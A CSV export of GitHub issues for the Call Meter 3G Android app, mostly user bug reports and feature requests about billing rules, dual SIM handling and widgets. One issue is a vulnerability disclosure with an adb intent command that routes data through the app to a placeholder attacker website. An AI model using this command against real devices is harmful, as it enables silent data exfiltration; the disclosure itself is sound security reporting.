repository,state,title,label,body
felixb/callmeter,closed,Data rounding,[],"my provider rounds up data usage to MB's on a daily basis. so eg. a day usage of 3.25MB is rounded to 4MB at the end of the day.
my monthly total is now showing incorrectly due to this daily rounding/correction.
is this option somewhere available in the settings? 

regards Eddict 
"
felixb/callmeter,closed,Second SIM (Dual SIM) is logged as roaming while in its home country,"[Label(name=""cant-fix"")]","Thanks for a great app, really useful! I just have one issue which I'm hoping there is a solution to!

I have a dual SIM Huawei P8 Lite running Android 5.0.1.
The first SIM (id 0) is a UK number, which is correctly identified by Call Meter as roaming while in Switzerland and not roaming while in the UK. 
The second SIM (id 1) is a Swiss number, which is logged by Call Meter as ""roaming"" even when in Switzerland. When I export the logs to CSV, roaming = 1 for any SMS sent from the Swiss number to other Swiss phones within Switzerland (verified I wasn't roaming by looking at my phone account). 

If I go into Settings/About phone/Status/Network/SIM 1 it is shown as 'Roaming', SIM 2 is shown as 'Not Roaming'.

Not sure what the problem could be, but maybe Call Meter assumes the second SIM is roaming simply because the first SIM is roaming? Or Call Meter isn't able to read the 'Not Roaming' value of the second SIM?
"
felixb/callmeter,closed,"Feature request: include from calls ""not solved""",[],"There is no ""include number"" setting above exclude number.
I am posting the screenshot. I am talking about preference then advance preferences then number groups.
Please read my previously closed post to catch the exact issue.
![screenshot_2016-04-16-12-59-46](https://cloud.githubusercontent.com/assets/18465448/14579766/06d33d74-03d4-11e6-890e-f384fec62132.png)
![screenshot_2016-04-16-12-59-29](https://cloud.githubusercontent.com/assets/18465448/14579767/06d5db1a-03d4-11e6-9db8-ea2c15d1a191.png)
"
felixb/callmeter,closed,Feature request: include from calls,[],"Dear sir
There is an option in advance preference as ""exclude from calls"", which will exclude the numbers and will not take consideration effect of these numbers in the plan.
But sir , I have a minute plan and I want to consider the effect of one number(minutes will cut on that number and money will cut on others numbers) on my plan.
I call so many people, if I exclude then there will be a huge list and time consumption for creating that list by your option ""exclude from calls"".  Because I need the effect of one number.
Hence sir please make a option ""only include from calls"" so that I can include that number and see the effect of that numbers only.
Thank you sir....
"
felixb/callmeter,closed,No log singe CM 13,"[Label(name=""waiting-for-info"")]","Since installing CM 13 snapshot a few days ago, the log is not updated anymore (CM 12.1 worked well). I tried to give call meter all rights and deactivated all restrictions. Nothing helped.
Can you help?
Thank you 
"
felixb/callmeter,closed,Export to SD Android 6.0,[],"Export rules to SD doesn't work
"
felixb/callmeter,closed,no option to exclude x amount of Data and minutes,[],"Some plans have included minutes and data for both local and international calls. 
There is not options in the rules to include this. 
Similar to excluding certain times of the day. There are plans that comes with first 100minutes are not billed and first 200mb are not billed.
"
felixb/callmeter,closed,Take the opportunity to appoint a kind of currency in the settings.,"[Label(name=""wont-fix"")]","Take the opportunity to appoint a kind of currency in the settings. For the Ukrainian currency - hryvnia (грн.) (₴), but in the default settings, applications and unchangeable stand rubles  (руб.)( ₽) .
 Sorry for my bad English. 
![453dbece-d326-11e5-8a6d-9242ddc3e254](https://cloud.githubusercontent.com/assets/17225045/13033725/1f8a9c16-d32a-11e5-9985-4bdf4ae64ecb.png)
"
felixb/callmeter,closed,mintue round up on out going calls,[],"maybe i've overlooked a setting that is already there, but is there a way/are you thinking to include an option where each call minutes are rounded up? this is how my uk talktalk account apparently counts up my used minutes ( ie a call or 10 seconds = 1 minute, 2:35 = 3 minutes...etc) and so i'm obviously going to get through my 100 minutes allowance quicker than this app would calculate. thanks for the good app though. looks great in every other way.
"
felixb/callmeter,closed,Call Meter 3G 3.11.11 stops working,[],"It stops working after few days.   I am facing this problem past few months.  Everytime I got to reinstall and loose data.   Pls Help.
"
felixb/callmeter,closed,delete or edit SIM number,[],"How to delete or edit old SIM card number in menu? My provider change my SIM often. 
"
felixb/callmeter,closed,Plans with multiple buckets,[],"I'm having difficulty conveying the pricing structure of my operator to Call Meter.

The operator is Tracfone USA, a prepaid. They use three buckets, separate for calls, text (SMS and MMS) and data.  So, e.g., a $20 refill card adds 180 minutes, 180 texts, and 180 MB. This seems to trigger two issues with the Call Meter:

Under Advanced Preferences I selected a Prepaid Plan, and added two more billing periods to keep track of each bucket separately. That seems to work, but in the ""Now"" view under the first billing period Call Meter displays the sum of all three of them (540 rather than the expected 180) and the names of the billing periods are not displayed anywhere which is confusing (see the attached screenshot).

The second issue is that Call Meter seems to be coded around the concept of the balance always being a cash value. But in my case the balance is simply the number of minutes/texts/MBs. So I set the individual costs of each call/SMS/MMS to ""1"" and set the custom currency symbol to "" "" (a space) to get rid of the dollar sign. That seems to work, but as you can see in the screenshot, it looks kind-of ugly (the cumulative ""cost"" displayed under each item is redundant and just clutters the display).

I wonder if there is already a better way to do what I want? Would I be better off using limits instead?

![screenshot_2015-12-23-15-19-56](https://cloud.githubusercontent.com/assets/16415200/11978424/2a24c7b2-a951-11e5-852b-db7992a1204c.png)
"
felixb/callmeter,closed,Calls total cost not calculated correctly,[],"I have set up Call Meter NG on my Galaxy S4 (on Android Lollipop) with a simple single plan.  Calls cost 0.03 per 60 second increment, so a 1 second call costs 0.03 a 1 minute call costs 0.03 and a 1 minute 1 second call costs 0.06.  I set the billing mode as 60/60, with a per call cost of zero, and a per minute cost of 3p and no free calls.

Since the date I set this up I have made 5 calls each under 60 seconds, and one which was 2 minutes 6 seconds.  The total cost is therefore 5x0.03 + -0.09 = 24p

Call Minder NG displays:
Out 0.19£ ¦ 6:13 (6) ¦ 3:06

Since calls are billed at £0.03 per minute (60s) then the total cost cannot be £0.19 - it has to be a multiple of £0.03 !
"
felixb/callmeter,closed,Version 3.11.10 doesn't work on Samsung Galaxy Pocket,[],"version 3.11.10 doesn't work on Samsung GT-S5300 (Galaxy Pocket) android version 2.3.6
"
felixb/callmeter,closed,Update on F-Droid,[],"Hi! I work on F-Droid and I'm trying to update your app there, but there are a few blockers:
- You use play-services, which is non-free. If you made it optional like with a flavour, then we could build the foss flavour. Example gradle file: [PassAndroid](https://github.com/ligi/PassAndroid/blob/master/android/build.gradle)
- You use third party maven repos (the `githubusercontent` urls). Are they really necessary? Isn't mavenCentral/jcenter or even jitpack enough?
- Your version name and code are generated, so we can't pick them up automatically to detect when the app is out of date.
"
felixb/callmeter,closed,Data not recognized,[],"i there,

i use this https://felixb.github.io/callmeter/rulesets/Germany_WinSIM_LTE_Mini_Plus_2000.xml
ruleset, but only SMS ands Calls are recognized. I add some screen shots
![screenshot_2015-10-29-11-50-29](https://cloud.githubusercontent.com/assets/4420944/10869469/19b6ed6a-80b1-11e5-862a-10df247255f6.png)
![screenshot_2015-10-29-11-50-48](https://cloud.githubusercontent.com/assets/4420944/10869470/19b8e854-80b1-11e5-8e81-8f3609f875f9.png)

. Sony Xperia Z 1 Compact CM12.1. 
Some hints to solve this?

Micha
"
felixb/callmeter,open,Feature request: make 80% warning smarter,"[Label(name=""enhancement"")]","Having an 80% warning pop up doesn't make much sense if 95% of the billing cycle has passed.
A warning for something akin to ""percentage used minutes > percentage of passed billing cycle, but only of greater than x%"" (you come up with a better name I'm sure - I'm not a native English speaker) would make more sense.
In other words it's a warning about “if you keep that pace of using up your minutes you will max out your plan before the end of the billing cycle!""

The ""only if greater than"" helps suppress unnecessary warnings like when using 5% of the minutes on the first day of the billing cycle.
"
felixb/callmeter,open,Feature: roaming network (or country),"[Label(name=""enhancement"")]","Hi, 
just an idea I got when looking at my plan - I have some minutes available for placing calls when roaming in EU. Also there are telco providers around here that offer ""local prices"" when you roam with ""friendly provider"" in neighboring country. 
To be able to configure those, Callmeter should be able to distinguish what network I am currently roaming in -- to compare MCCMNC or network name of current network with a value that can be configured in rules. Maybe a list containing MCCMNCs or network names could also be useful for creating roaming zones or special rates...  
Cheers!
"
felixb/callmeter,closed,Crash when editing rule,[],"Hi,
I have Sony Z3 Compact (D5803) Android 5.1.1.
When I pick a Call rule, choose Edit and scroll down, the last item I see is ""Is SIP call"" .  After that the system says app crashed and app reloads the list of rules. Similar stuff happens with SMS rules (last item shown is ""Is Websms"") and MMS rules (editing doesn't start, app goes back to Preferences). This prevents me from editing stuff like include/exclude groups for the rules... unless I learn how to edit config file by hand :)

(edit: exchanged sentence order to improve readability)
"
felixb/callmeter,closed,Evenings weekends,[],"Is there a simple way to set up free unlimited evenings and weekends for calls? Start and stop times for eve and checkbox for free weekends?
"
felixb/callmeter,closed,Multi select for exclude from calls/sms,[],"As i have alot of friends with whom my calling js free, its a tedious task to add them one by one. I suggested this app to a friend of mine and he didn't want to add so many free number one by one. 
So is it possible that your app imports all the contact and from there we can multi select like 15-20 on one go. 
Thanks :) 
"
felixb/callmeter,closed,incoming message 2 widget count sum,"[Label(name=""waiting-for-info"")]","first of all sorry for my English
i'm ussing a sony xperiaz c6603 (android 5.1.1)
the incomming message counter 2 show inside de app the shows the right number, but in the widget 
it shows a summation of all messages no matter month.
it seems that only about this item

![screenshot_2015-09-30-09-04-25](https://cloud.githubusercontent.com/assets/14906926/10193848/124ac850-674b-11e5-982c-d276d9ad6b45.png)
![screenshot_2015-09-30-09-04-39](https://cloud.githubusercontent.com/assets/14906926/10193849/12be19b8-674b-11e5-9e92-dff8167191bb.png)
regards Raydel
"
felixb/callmeter,closed,copy rules or tariff,"[Label(name=""waiting-for-info"")]","Dear sir, how to copy the rules because new rules no change lot of. If I change only one I make a new rules lot of things not one. Please help. Thank you.
"
felixb/callmeter,closed,Still advertising after donation :(,[],"Today at about 21:10h I made donation via play store but still advertising in callmeter.
Restart of Smarthone didnt help. CallMeter3G v3.11.7 on Phone running Android 4.1.2.
"
felixb/callmeter,closed,Ads cover entire screen,[],"I clicked 'got it' at the bottom where it told me it uses devices id. Now the ads suddenly cover the entire screen. When I close call meter, I can see the normal stats for five seconds before the ads load and cover the screen again. 

(covering the entire screen means one small add on top and the rest of my screen empty ) 
"
felixb/callmeter,closed,Unable to pull in android studio,"[Label(name=""waiting-for-info"")]","Error:(16, 0) Gradle DSL method not found: 'play()'
Possible causes:<ul><li>The project 'callmeter-master' may be using a version of Gradle that does not contain the method.
<a href=""open.wrapper.file"">Open Gradle wrapper file</a></li><li>The build file may be missing a Gradle plugin.
<a href=""apply.gradle.plugin"">Apply Gradle plugin</a></li>
"
felixb/callmeter,closed,Dual sim data,[],"Hey 
Great that there is a app with dual sim support. 
Only i miss the data part. 
I have two data bundles and like to measure them separately 
Regards Mark 
"
felixb/callmeter,open,Roaming calls are not calculated,[],"I have set the rule set correctly for calls out and calls roaming. Call out is set to be used only while not roaming. Calls roaming is set to be used only while roaming. Today when i am in roaming network the latest version call meter 3g is not able to detect the roaming state and caluclates the OG call simply as per the call out plan. I have also checked in settings>about>networks and signal wherin my network state is roaming.
This is a bug, kindly look into it. FYI iam using htc one dual with 5.0.2 lollipop.
"
felixb/callmeter,closed,Limit on Calls and SMS,[],"I could use a limit entry for both calls and SMS, like is already available for data. My plan is a limited plan on calls and SMS too, not just data.
"
felixb/callmeter,closed,{Can't delete comment},[],
felixb/callmeter,closed,Inter-Application Vulnerability,"[Label(name=""usability""), Label(name=""wont-fix"")]","Hi there,

This issue report is a part of a research. We have found that your application is vulnerable to inter-application communication. It can be replicated as follows:

adb shell 'am start ""intent://ATTACKER_WEBSITE_WITH_GET_REQUEST#Intent;scheme=http;action=android.intent.action.VIEW;category=android.intent.category.ALTERNATIVE;component=de.ub0r.android.callmeter/.ui.prefs.Preferences;end""'

By automating this command, an attacking app without INTERNET permission can post sensitive information to the attacker's website.

The problem is in getStream(final ContentResolver cr, final Uri uri) method in class Preferences where the scheme is checked if it's 'http' or 'https' but the data is not checked if it's XML and a connection is open on the uri.

Can you please confirm this?

Thank you,
Biniam
"
felixb/callmeter,closed,Feedback link from the app takes the user to Googlecode page,[],"Hi Felixb,

I tried using the feedback link from the app, it redirects me to Google code page  https://code.google.com/p/callmeter/issues/list where I'm informed that code support has been moved to github.

Can you please link the feedback directly to Github?

Thanks,
Abhijeet
"
felixb/callmeter,closed,No option for sim id in HTC one dual sim 802d.,[],"As the title suggests the call meter 3g v. 3.11.7 does not show the option for sim id in rule set for calls. The most weired part is the app shows the option of sim id in sms rule which certainly means that it can detect the dual sim functionality.
plz. sort the issue in next update.
i am on android 5.02 with official htc rom and rooted with twrp recovery installed.
"
felixb/callmeter,closed,Changing percentage values to numbers,"[Label(name=""UI""), Label(name=""wont-fix"")]","Another feature would be great, as well:
The possibility to change the percentage values to (whole) numbers.

For example, 100 min free calls a month and already used 20 min:

Instead of ""Outgoing calls 20% | 20:00 min"" it would look like

""Outgoing calls 20:00 min | 80:00 min remaining""
"
felixb/callmeter,closed,Android 5.1 - material design,"[Label(name=""UI""), Label(name=""wont-fix"")]","Hey Felix,
I do really like your app Call Meter 3G. But since Android 5 and material design the app looks a bit ""old fashioned"". Are you planning to implement material design for Call Meter 3G? That would be great :-)

Greetings,
Andi
"
felixb/callmeter,closed,single time (non-periodic) plan,"[Label(name=""enhancement""), Label(name=""wont-fix"")]","is there a way to add a plan which is available to certain numbers for just one limited time interval?
I can add all parameters, except that the time is not periodic.  If i add the plan, the program assumes it is periodic and was valid already in the previous month.  I did not find a way to avoid this.
""Billing period"" is the only way i found to add start date and duration, but then it is automatically a periodic time.

cheers, Neo.
"
felixb/callmeter,closed,Enhancement to have multiple data plans,[],"in UAE, and i am sure in other countries too, there are different data plans. you have a social data and normal data. for example. i have 1 GB monthly social data (WhatsApp, Facebook, BBM & Twitter) and 400 MB monthly for all other data.

is there a way that we can have 2 data plans, and the same way that we select a number list to select a list of apps that the data of those apps is calculated separately. 
"
felixb/callmeter,closed,Bill mode 90/60 bills wrong,"[Label(name=""bug""), Label(name=""waiting-for-info"")]","I installed Call meter 3G for custom billing mode, but found out that custom mode 90/60 doesn't work, it rounds first 90 seconds correctly but afterwards it rounds on 120s, 180s, 240s etc.

It should be like 150s, 210s instead.
"
felixb/callmeter,closed,All calls and SMS assigned to SIM1 in dual sim phone,"[Label(name=""waiting-for-info"")]","Call Meter 3G (v3.11.7) used on Samsung S5 Mini Duos does count all calls and SMS from both SIM cards together and classifies them as SIM1.

""Calls In/Out 2"" and ""SMS In/Out 2"" are always showing 0.

Phone logs (build in) show a small icon indicating 1st or 2nd SIM card properly. Call Meter 3G seems to not use this info.

To reproduce a bug:
1. Install Call Meter 3G on S5 Mini Duos with 2 SIM cards
2. Call & text from both cards
3. Check logs of Call Meter 3G
"
felixb/callmeter,closed,Call Meter 3G crashes on editing a rule,"[Label(name=""bug"")]","I try to edit any rule, and CM 3G crashes when I scroll down the screen (most probably just after ""Exclude hours"" appears).

This happens on a Nexus 4 with Android 5.1.1 installed. This is the first time I have installed CM, so I do not know how it behaved in previous versions of Android.
"
felixb/callmeter,closed,Call Meter 3G on Fdroid,"[Label(name=""cant-fix"")]","Hi, I've seen that the latest version available through fdroid is from Nov. 2013 while the latest one from Play Store is from Feb. 2015. Is it possible that you also provide the newest version and upcoming releases on fdroid?
"
felixb/callmeter,closed,Calculate Call In during roaming in minutes 60/60,"[Label(name=""waiting-for-info"")]","Whese to config setting for calls in during roaming because incoming calls have charged during roaming.
"
felixb/callmeter,closed,"How to remove ""SMS 2""?",[],"Hi folks, 

how can I remove the ""SMS 2""  entry in the overview? 

Thanks a lot for your help. 

Greets 

Sascha 
"
felixb/callmeter,closed,Call Meter 3G could be causing incoming SMS messages are not shown by messaging apps,"[Label(name=""waiting-for-info"")]","After updating my Nexus 5 to Android 5.1.1 the incoming SMS messages were not shown by messaging apps. I captured some logs and the ROM dev analyzed them but he didn't find anything anormal.

So I started to uninstall all my apps related to messaging and I found Call Meter 3G was the one causing the issue.
"
felixb/callmeter,open,widget icon defaults to phone for mixed type plans,"[Label(name=""UI""), Label(name=""bug"")]",
felixb/callmeter,closed,exclude apps from data plan,"[Label(name=""cant-fix"")]","Hello there!

As more and more companies offer unlimited streaming or browsing through specific applications, it would be nice to be able to exclude those apps from the data plan.

Would something like that be possible? Thanks in advance!

Cheers,
Theodore
"
felixb/callmeter,closed,bill period length: 28d/4w,"[Label(name=""enhancement"")]",
felixb/callmeter,closed,TIME-BASED DATA CHARGE,"[Label(name=""duplicate"")]","Hi,
My phone company charges me $0.10 per 15 minutes in using data. Is there a way for CM3 to record these data charges?
"
felixb/callmeter,closed,UTF-8 charset sms,"[Label(name=""cant-fix"")]","I usually write utf-8 sms because i use some special char. But UTF-8 sms only 74 char and not 160 char. but call meter call meter 3g doesn't count this good
"
felixb/callmeter,closed,lot of space status screen,"[Label(name=""wont-fix"")]","I make a tariff but my tariff name long. The software add lot of space status screen. I attached some picture.
![shot_2015-03-17_11-32-17](https://cloud.githubusercontent.com/assets/3310658/6685511/d26522c6-cc9a-11e4-9d8b-c3bd23a5a58d.png)
![shot_2015-03-17_11-31-51](https://cloud.githubusercontent.com/assets/3310658/6685510/d25d210c-cc9a-11e4-9ac5-bcc40b15db65.png)
![shot_2015-03-17_11-32-07](https://cloud.githubusercontent.com/assets/3310658/6685512/d265add6-cc9a-11e4-86c5-2ca5f24c8d43.png)
"
felixb/callmeter,closed,Calls are billed from the moment they are dialed,"[Label(name=""duplicate"")]","Hello,

Using the latest version on my Moto G (2nd Gen).

Recently I have noticed that, the Call Meter bills the outgoing calls right from the moment they are dialed.

My network provide bills the calls from the moment they are picked by the called person. And I guess every network provider around the globe does the same.

Please fix this issue.

Thanks in advance.

Abhishek Bawkar
"
felixb/callmeter,closed,4×1 widget (feature addition),"[Label(name=""duplicate"")]","It would be good to have a widget of size 4 x 1, rather than current 1 × 1. 
This would help to see the same data we see on opening the app, on the home screen. The displayable fields should be configurable. 
"
felixb/callmeter,closed,Data plan is charged per day,"[Label(name=""duplicate"")]","Hi,

I have a 3G plan that works like this:
- I pay 0,7 per day (only the days I use) and its unlimited amount of data for that day. How to setup that?
# question
"
felixb/callmeter,closed,plan,[],"I have plan in which 2000 min free in same circle for all lacal call
After limit charges are
1 same nate work mob .2
2 other network mon .3
3 on land line  .5
How to set plan
"
felixb/callmeter,open,data stats not working since Android 5.0,"[Label(name=""cant-fix"")]","google seems to have broken a lot with android 5.0.
like call logs are broken (#53) data stats are broken too.
"
felixb/callmeter,closed,Billing: At least 1MB need to be charged though one session is less,"[Label(name=""cant-fix""), Label(name=""enhancement"")]","My Provider always charges 1 MB though the session had not that much traffic.Callmeter 3G charges 0 so there is always a gap betwean the cost that Callmeter tells me and what I actually have to pay.  How can I set this up? Is there a setting where I can set a minimum charge for a session?

PS: Sorry for any mistakes but English is not my native language
"
felixb/callmeter,open,unconnected calls log as charges since Android 5.0,"[Label(name=""cant-fix"")]","Using CM3G 3.11.4 Nexus 5 A5, just noticed that my unconnected  unanswered attempted phone calls log as charges in CM, that seems to coincide with A5 install.
"
felixb/callmeter,closed,Wrong calculation of used talk units,"[Label(name=""waiting-for-info"")]","Hi felixb,

I have 100 free minutes in my plan.
Call Meter is showing me the correct number of 91 used minutes and 9 remaining free minutes.
My provider shows me the same numbers.
However Call Meter is displaying that I have used 29 paid minutes, which is obviously wrong.
So maybe there is some mistake happening during the calculation?
Because cleary Call Meter is recognising the amount of talk time correctly.

Sincerley,
Nalf
"
felixb/callmeter,closed,"When using ""SwitchMe"" logs are not combined","[Label(name=""wont-fix"")]","On my device with [SwitchMe](https://play.google.com/store/apps/details?id=fahrbot.apps.switchme&hl=en) installed usage statistics from different accounts are not combined.
It will be nice to sum all usage up and show (use for warning, etc.) combined result since mobile provider counts minutes/messages/megabytes independently on currently active account )))
"
felixb/callmeter,open,Widget Colors,"[Label(name=""UI""), Label(name=""enhancement"")]","Hi over there,

any chance of changing the colors (resp. increase ""readability"") in the widgets?

As a slightly ""green/red color impaired"" guy (as about 30 % of all men are, if you believe in the statistics), it's really hard to distinguish between ""Gold"" (#ffffd000,  - for ""plan slightly exceeded by e. g. 2% points"") and ""Lime green"" (ff00ff00 - for ""everything's fine, cause there are 5 % points left"").

I would strongly prefer the colors, Call Meter 3G uses in the program itself (esp. a darker green than ""Lime""), cause these are way more easy to read - esp. ""at a glance"".

Thx in advance!

Cheers, Magpie
"
felixb/callmeter,closed,Recognize origin SIM card,"[Label(name=""invalid"")]","Now  that I have a dual SIM smartphone, the calls for each one have different charge plans, so it would be nice to specify the SIM card of each plan. Now I'm having to keep track of only one SIM, and deleting the calls made from the other from the log. 
A temporary solution would be to make available to change the plan of a specific call in the log 
"
felixb/callmeter,closed,Add group number by label,"[Label(name=""duplicate"")]","It would be great if we could add a specific number group by the label specified in the number within the contact. Ex.  I have all my contacts tagged with the company name in each contact.  I'd like to be able to count all number of my company in the plan of free calls without having to add one by one. 
"
felixb/callmeter,closed,Hi it is possible to replace the% by how much ,"[Label(name=""duplicate"")]","Hi
it is possible to replace the% by how much is left. voobeeld 101 calls left use 49 from the 150 calls many thanks

ist es möglich, den% von dem was bleibt, ersetzen. voobeeld 101 Anrufe links Gebrauch 49 von den 150 Anrufe Vielen Dank
"
felixb/callmeter,closed,my provider change SIM card,"[Label(name=""waiting-for-info"")]","My provider change SIM card because it was too old. The software add a new SIM address and I don't merge old  and new statistics. Please help how to it.
"
felixb/callmeter,closed,mixed plans: units are shown as seconds for call logs,[],"Bei
Abgerechnete Länge ist die Einheit s statt min !?
"
felixb/callmeter,closed,new plan setup required,"[Label(name=""setup-rules"")]","my mobile operator offers me a 500 minutes. 
after that to the same operator mobil numbers minutes are 0.00 per minute but to others mobile networks are paid 0.20 per minute
i have created 2 plans - one for my operator and 1 for all the rest and both plan I combined in anorher plan so i can track this first 500 minutes but the problems is i can't setup billing only to other networks after this 500 minutes.
"
felixb/callmeter,closed,Updating prepaid balance,[],"I'd love an easy interface to update my prepaid balance, when I refill my prepaid account.
That might be a button that's similar to what I suggested in #42, except it raises my balance.
Raising it by a fixed/predefined amount is fine for me.
"
felixb/callmeter,closed,Handling prepaid packages that don't have a billing period,[],"I have a prepaid plan that offers packages that last either 30 days, or until they're used up, whichever comes first. That means that I can't set a fixed billing period, because I may buy that package twice in one month.
Is there any way to trigger buying such a package, so that it deducts the cost of it and starts a new billing period (without changing the length of previous periods)?

The details of the plan are here (German):
![screen shot 2014-09-21 at 13 02 48](https://cloud.githubusercontent.com/assets/752836/4348121/dea4bef4-417e-11e4-9aae-1969308291ff.png)
from: https://www.aldi-mobile.ch/angebote/smart50.html
"
felixb/callmeter,closed,"After update to 3.11.3, rules are not working anymore",[],"After updating from 3.11.2 to 3.11.3, CM3 began to ask me which rules should apply for certain phonenumbers because it couldn't choose by itself anymore. By downgrading to 3.11.2 again, I fixed the behavior.
Could you pleae help me? What would be the next steps?

Sebastian
"
felixb/callmeter,closed,more Widgets please,"[Label(name=""duplicate"")]","Please add more little widgets. 
Like ""Plan Monitor Ace""
Thank you
"
